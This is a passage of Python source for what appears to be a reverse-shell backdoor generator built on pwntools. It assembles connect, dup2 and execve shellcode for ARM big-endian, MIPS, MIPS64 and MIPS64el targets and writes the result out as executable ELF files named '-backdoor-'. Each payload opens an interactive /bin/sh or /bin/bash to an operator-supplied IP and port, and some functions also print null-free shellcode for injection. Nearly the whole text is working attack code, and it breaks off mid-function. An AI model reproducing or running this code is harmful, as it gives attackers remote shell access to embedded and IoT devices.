	context.arch='arm'
	context.endian='big'
	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode2='''
	mov r5,r6
	mov r0,r5
	mov r1,#0
	movw r7,#0x3f
	svc #0
	mov r0,r5
	mov r1,#1
	svc #0
	mov r0,r5
	mov r1,#2
	svc #0
	'''
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shellcode2=asm(shellcode2)
	shellcode3=asm(shellcraft.execve(shell_path, shell_path_list, envp))
	all_reverseshell=basic_shellcode+shellcode2+shellcode3
	ELF_data =make_elf(all_reverseshell)
	if filename==None:
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch='i386'
		context.bits="32"
		context.endian="little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

def armebv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
	context.bits="32"
	context.arch='arm'
	context.endian='big'
	if shell_path == "/bin/bash" or shell_path == "bash":
		shellcode='''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2b]
	strb r4,[sp,#-0x2c]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x61
	strb r7,[sp,#-0x17]
	mov r7,#0x62
	strb r7,[sp,#-0x18]
	mov r7,#0x2f
	strb r7,[sp,#-0x19]
	mov r7,#0x6e
	strb r7,[sp,#-0x1a]
	mov r7,#0x69
	strb r7,[sp,#-0x1b]
	mov r7,#0x62
	strb r7,[sp,#-0x1c]
	mov r7,#0x2f
	strb r7,[sp,#-0x1d]
	eor r7, r7
	strb r7,[sp,#-0x1e]
	mov r7,#0x69
	strb r7,[sp,#-0x1f]
	mov r7,#0x2d
	strb r7,[sp,#-0x20]
	add r4,sp,#-0x1d
	add r8,sp,#-0x20
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r1}
	push {r0,r8}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shellcode = '''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2b]
	strb r4,[sp,#-0x2c]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	eor r7, r7
	strb r7,[sp,#-0x1e]
	mov r7,#0x69
	strb r7,[sp,#-0x1f]
	mov r7,#0x2d
	strb r7,[sp,#-0x20]
	add r8,sp,#-0x20
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r1}
	push {r0,r8}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	handle_ip=reverse_ip.split('.')
	handle_port=list(p16(reverse_port)[::-1])
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[1],handle_port[0])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	shellcode=asm(shellcode)[:-2]
	ELF_data = make_elf(shellcode)
	if filename==None:
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch='i386'
		context.bits="32"
		context.endian="little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def mips_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
	context.arch='mips'
	context.endian='big'
	context.bits="32"
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	nor $a1,$zero,-1
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	shellcode_execve = shellcraft.execve(shell_path,shell_path_list, envp)
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	#all_shellcode = shellcraft.connect(reverse_ip,reverse_port) + shellcode_dump_sh + shellcode_execve
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcode_execve)
	ELF_data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	ELF_data=make_elf(ELF_data_shellcode)
	if filename==None:
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return 
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
			return 
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
				return 
			else:
				return 
		
def mipsel_reverse_sl(reverse_ip,reverse_port):
	context.arch='mips'
	context.endian='little'
	context.bits="32"
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	xor $t2,$t2
	move $a1,$t2
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	shellcode_len=len(data_shellcode)
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(data_shellcode,shellcode_hex)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%(int(data_shellcode.index(b"\x00"))))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return data_shellcode
	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return data_shellcode

def mips_reverse_sl(reverse_ip,reverse_port):
	context.arch='mips'
	context.bits="32"
	context.endian='big'
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	xor $t2,$t2
	move $a1,$t2
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	shellcode_len=len(data_shellcode)
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(data_shellcode,shellcode_hex)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%(int(data_shellcode.index(b"\x00"))))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return data_shellcode
	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return data_shellcode

def mips64el_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
	'''
	socket number v0=0x13b0
	connect number v0=0x13b1
	dup2  number v0=0x13A8
	execve number v0=0x13c1

	:param reverse_ip:
	:param reverse_port:
	:param filename:
	:return:
	'''
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_port=int(hex(reverse_port),16)
	reverse_port=hex(0x10000-int("0x"+enhex(p16(reverse_port)),16)-1)
	reverse_ip=list(reverse_ip.split("."))
	reverse_ip_high=hex(0x10000-((int(reverse_ip[1])<<8)+int(reverse_ip[0]))-1)
	#print(reverse_ip_high)
	#print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
	#print(reverse_ip_high)
	reverse_ip_low=hex(0x10000-((int(reverse_ip[3])<<8)+int(reverse_ip[2]))-1)
	#print(reverse_ip_low)
	context.arch='mips64'
	context.bits="64"
	context.endian='little'
	shellcode_connect='''
	li      $t9, -3
	nor     $a0, $t9, $zero
	li      $t9, -3
	nor     $a1, $t9, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13b0
	syscall 0x40404
	sw      $v0, -4($sp)
	lw      $s0, -4($sp)
	lui     $t9, %s
	ori     $t9, $t9, 0xfffd
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	lui     $t9, %s
	ori     $t9, $t9, %s
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu  $sp, $sp, -8
	sw      $s0, -4($sp)
	lw      $a0, -4($sp)
	move     $a1,$sp
	li      $t9, -17
	nor     $a2, $t9, $zero
	li      $v0, 0x13b1
	syscall 0x40404
	'''
	shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_low,reverse_ip_high)
	shellcode_dup_sh='''
	move $a0,$s0
	nor $a1,$zero,-1
	li  $v0,0x13A8
	syscall 0x40404
	move $a0,$s0
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	move $a0,$s0
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	'''
	if shell_path == "/bin/sh" or shell_path=="sh":
		shellcode_execve='''
		li $t1, 0x6e69622f
		sw $t1, -8($sp)
		li $t9, ~0x68732f
		not $t1, $t9
		sw $t1, -4($sp)
		daddiu $sp, $sp, -8
		daddiu $a0, $sp, 0 /* mov $a0, $sp */
		/* push argument array ['/bin/sh\x00', '-i\x00'] */
		/* push '/bin/sh\x00-i\x00\x00' */
		li $t1, 0x6e69622f
		sw $t1, -12($sp)
		li $t9, ~0x68732f
		not $t1, $t9
		sw $t1, -8($sp)
		ori $t1, $zero, 26925
		sw $t1, -4($sp)
		daddiu $sp, $sp, -12
		slti $a1, $zero, 0xFFFF /* $a1 = 0 */
		sd $a1, -8($sp)
		daddiu $sp, $sp, -8 /* null terminate */
		li $t9, ~0xc
		not $a1, $t9
		dadd $a1, $sp, $a1
		dadd $a1, $a1, 4
		sd $a1, -8($sp)
		daddi $sp, $sp, -8 /* '-i\x00' */
		li $t9, ~16
		not $a1, $t9
		dadd $a1, $sp, $a1
		sd $a1, -8($sp)
		daddiu $sp, $sp, -8 /* '/bin/sh\x00' */
		daddiu $a1, $sp, 0 /* mov $a1, $sp */
		slti $a2, $zero, 0xFFFF /* $a2 = 0 */
		/* call execve() */
		li $v0,0x13c1
		syscall 0x40404

		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode_execve = '''
		li $t1, 0x6e69622f
		sw $t1, -12($sp)
		li $t1, 0x7361622f
		sw $t1, -8($sp)
		li $t9, ~0x68
		not $t1, $t9
		sw $t1, -4($sp)
		daddiu $sp, $sp, -12
		daddiu $a0, $sp, 0 /* mov $a0, $sp */
		/* push argument array ['/bin/bash\x00', '-i\x00'] */
		/* push '/bin/bash\x00-i\x00\x00' */
		li $t1, 0x6e69622f
		sw $t1, -16($sp)
		li $t1, 0x7361622f
		sw $t1, -12($sp)
		li $t9, ~0x692d0068
		not $t1, $t9
		sw $t1, -8($sp)
		sw $zero, -4($sp)
		daddiu $sp, $sp, -12
		slti $a1, $zero, 0xFFFF /* $a1 = 0 */
		sd $a1, -8($sp)
		daddiu $sp, $sp, -8 /* null terminate */
		li $t9, ~0xe
		not $a1, $t9
		dadd $a1, $sp, $a1
		sd $a1, -8($sp)
		daddiu $sp, $sp, -8 /* '-i\x00' */
		li $t9, ~16
		not $a1, $t9
		dadd $a1, $sp, $a1
		sd $a1, -8($sp)
		daddi $sp, $sp, -8 /* '/bin/bash\x00' */
		dadd $a1, $sp, $0 /* mov $a1, $sp */
		slti $a2, $zero, 0xFFFF /* $a2 = 0 */
		/* call execve() */
		li $v0,0x13c1
		syscall 0x40404

		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode=asm(shellcode_connect)+asm(shellcode_dup_sh)+asm(shellcode_execve)
	ELF_data =make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

def mips64_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
	context.arch='mips64'
	context.bits="64"
	context.endian='big'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_port = int(hex(reverse_port), 16)
	reverse_port = hex(0x10000 - int("0x" + enhex(p16(reverse_port)), 16) - 1)
	reverse_ip = list(reverse_ip.split("."))
	reverse_ip_high = hex(0x10000 - ((int(reverse_ip[0]) << 8) + int(reverse_ip[1])) - 1)
	# print(reverse_ip_high)
	# print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
	# print(reverse_ip_high)
	reverse_ip_low = hex(0x10000 - ((int(reverse_ip[2]) << 8) + int(reverse_ip[3])) - 1)
	shellcode_connect = '''
	li      $t9, -3
	nor     $a0, $t9, $zero
	li      $t9, -3
	nor     $a1, $t9, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13b0
	syscall 0x40404
	sw      $v0, -4($sp)
	lw      $s0, -4($sp)
	lui     $t9, 0xfffd
	ori     $t9, $t9, %s
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	lui     $t9, %s
	ori     $t9, $t9, %s
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu  $sp, $sp, -8
	sw      $s0, -4($sp)
	lw      $a0, -4($sp)
	move     $a1,$sp
	li      $t9, -17
	nor     $a2, $t9, $zero
	li      $v0, 0x13b1
	syscall 0x40404
	'''
	shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_high,reverse_ip_low)
	shellcode_dup_sh='''
	move $a0,$s0
	nor $a1,$zero,-1
	li  $v0,0x13A8
	syscall 0x40404
	move $a0,$s0
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	move $a0,$s0
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	'''
	if shell_path == "/bin/sh" or shell_path == "sh":
		shellcode_execve='''
		li $t1, 0x2f62696e
		sw $t1, -8($sp)
		li $t9, ~0x2f736800
		not $t1, $t9
		sw $t1, -4($sp)
		daddiu $sp, $sp, -8
		daddiu $a0, $sp, 0 /* mov $a0, $sp */
		/* push argument array ['/bin/sh\x00', '-i\x00'] */
		/* push '/bin/sh\x00-i\x00\x00' */
		li $t1, 0x2f62696e
		sw $t1, -12($sp)
		li $t9, ~0x2f736800
		not $t1, $t9
		sw $t1, -8($sp)
		li $t9, ~0x2d690000
		not $t1, $t9
		sw $t1, -4($sp)
		daddiu $sp, $sp, -12
		slti $a1, $zero, 0xFFFF /* $a1 = 0 */
		sd $a1, -8($sp)
		daddiu $sp, $sp, -8 /* null terminate */
		li $t9, ~0xc
		not $a1, $t9
		dadd $a1, $sp, $a1
		dadd $a1, $a1, 4
		sd $a1, -8($sp)
		daddi $sp, $sp, -8 /* '-i\x00' */
		li $t9, ~16
		not $a1, $t9
		dadd $a1, $sp, $a1
		sd $a1, -8($sp)
		daddiu $sp, $sp, -8 /* '/bin/sh\x00' */
		daddiu $a1, $sp, 0 /* mov $a1, $sp */
		slti $a2, $zero, 0xFFFF /* $a2 = 0 */
		/* call execve() */
		li $v0,0x13c1
		syscall 0x40404

		'''
	elif shell_path == "/bin/bash" or shell_path == "bash":
		shellcode_execve = '''
		li $t1, 0x2f62696e
		sw $t1, -12($sp)
		li $t1, 0x2f626173
		sw $t1, -8($sp)
		li $t9, ~0x68000000
		not $t1, $t9
		sw $t1, -4($sp)
		daddiu $sp, $sp, -12
		daddiu $a0, $sp, 0 /* mov $a0, $sp */
		/* push argument array ['/bin/bash\x00', '-i\x00'] */
		/* push '/bin/bash\x00-i\x00\x00' */
		li $t1, 0x2f62696e
		sw $t1, -16($sp)
		li $t1, 0x2f626173
		sw $t1, -12($sp)
		li $t9, ~0x68002d69
		not $t1, $t9
		sw $t1, -8($sp)
		sw $zero, -4($sp)
		daddiu $sp, $sp, -12
		slti $a1, $zero, 0xFFFF /* $a1 = 0 */
		sd $a1, -8($sp)
		daddiu $sp, $sp, -8 /* null terminate */
		li $t9, ~0xe
		not $a1, $t9
		dadd $a1, $sp, $a1
		sd $a1, -8($sp)
		daddiu $sp, $sp, -8 /* '-i\x00' */
		li $t9, ~16
		not $a1, $t9
		dadd $a1, $sp, $a1
		sd $a1, -8($sp)
		daddi $sp, $sp, -8 /* '/bin/bash\x00' */
		dadd $a1, $sp, $0 /* mov $a1, $sp */
		slti $a2, $zero, 0xFFFF /* $a2 = 0 */
		/* call execve() */
		li $v0,0x13c1
		syscall 0x40404

		'''
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
		
	shellcode = asm(shellcode_connect) + asm(shellcode_dup_sh) + asm(shellcode_execve)
	ELF_data = make_elf(shellcode)
	if (filename == None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 

def mips64el_reverse_sl(reverse_ip,reverse_port):
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_port=int(hex(reverse_port),16)
	reverse_port=hex(0x10000-int("0x"+enhex(p16(reverse_port)),16)-1)
	reverse_ip=list(reverse_ip.split("."))
	reverse_ip_high=hex(0x10000-((int(reverse_ip[1])<<8)+int(reverse_ip[0]))-1)
	#print(reverse_ip_high)
	#print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
	#print(reverse_ip_high)
	reverse_ip_low=hex(0x10000-((int(reverse_ip[3])<<8)+int(reverse_ip[2]))-1)
	#print(reverse_ip_low)
	context.arch='mips64'
	context.bits="64"
	context.endian='little'
	shellcode_connect='''
	li      $t9, -3
	nor     $a0, $t9, $zero
	li      $t9, -3
	nor     $a1, $t9, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13b0
	syscall 0x40404
	sw      $v0, -4($sp)
	lw      $s0, -4($sp)
	lui     $t9, %s
	ori     $t9, $t9, 0xfffd
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	lui     $t9, %s
	ori     $t9, $t9, %s
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu  $sp, $sp, -8
	sw      $s0, -4($sp)
	lw      $a0, -4($sp)
	move     $a1,$sp
	li      $t9, -17
	nor     $a2, $t9, $zero
	li      $v0, 0x13b1
	syscall 0x40404
	'''
	shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_low,reverse_ip_high)
	shellcode_dup_sh='''
	xor $t2,$t2
	move $a1,$t2
	li  $v0,0x13A8
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	'''
	shellcode_execve='''
	lui     $t1, 0x6e69
	ori     $t1, $t1, 0x622f
	sw      $t1, -8($sp)
	lui     $t9, 0xff97
	ori     $t9, $t9, 0x8cd0
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu   $sp, $sp, -8
	dadd     $a0, $sp, $zero
	lui     $t1, 0x6e69
	ori     $t1, $t1, 0x622f
	sw      $t1,-12($sp)
	lui     $t9, 0xff97
	ori     $t9, $t9, 0x8cd0
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	sw      $zero, -4($sp)
	daddiu   $sp, $sp, -12
	slti    $a1, $zero, -1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	li      $t9, -9
	nor     $a1, $t9, $zero
	dadd     $a1, $sp, $a1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	dadd     $a1, $sp, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13c1
	syscall 0x40404
	'''
	data_shellcode=asm(shellcode_connect)+asm(shellcode_dup_sh)+asm(shellcode_execve)
	shellcode_len = len(data_shellcode)
	shellcode_hex = ''
	shellcode_hex = extract_shellcode.extract_sl_print(data_shellcode, shellcode_hex)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in {}".format(data_shellcode.index(b"\x00")))
		print(shellcode_hex)
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
		return data_shellcode
	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
		return data_shellcode


def mips64_reverse_sl(reverse_ip,reverse_port):
	context.arch = 'mips64'
	context.bits = "64"
	context.endian = 'big'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_port = int(hex(reverse_port), 16)
	reverse_port = hex(0x10000 - int("0x" + enhex(p16(reverse_port)), 16) - 1)
	reverse_ip = list(reverse_ip.split("."))
	reverse_ip_high = hex(0x10000 - ((int(reverse_ip[0]) << 8) + int(reverse_ip[1])) - 1)
	# print(reverse_ip_high)
	# print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
	# print(reverse_ip_high)
	reverse_ip_low = hex(0x10000 - ((int(reverse_ip[2]) << 8) + int(reverse_ip[3])) - 1)
	shellcode_connect = '''
		li      $t9, -3
		nor     $a0, $t9, $zero
		li      $t9, -3
		nor     $a1, $t9, $zero
		slti    $a2, $zero, -1
		li      $v0, 0x13b0
		syscall 0x40404
		sw      $v0, -4($sp)
		lw      $s0, -4($sp)
		lui     $t9, 0xfffd
		ori     $t9, $t9, %s
		nor     $t1, $t9, $zero
		sw      $t1, -8($sp)
		lui     $t9, %s
		ori     $t9, $t9, %s
		nor     $t1, $t9, $zero
		sw      $t1, -4($sp)
		daddiu  $sp, $sp, -8
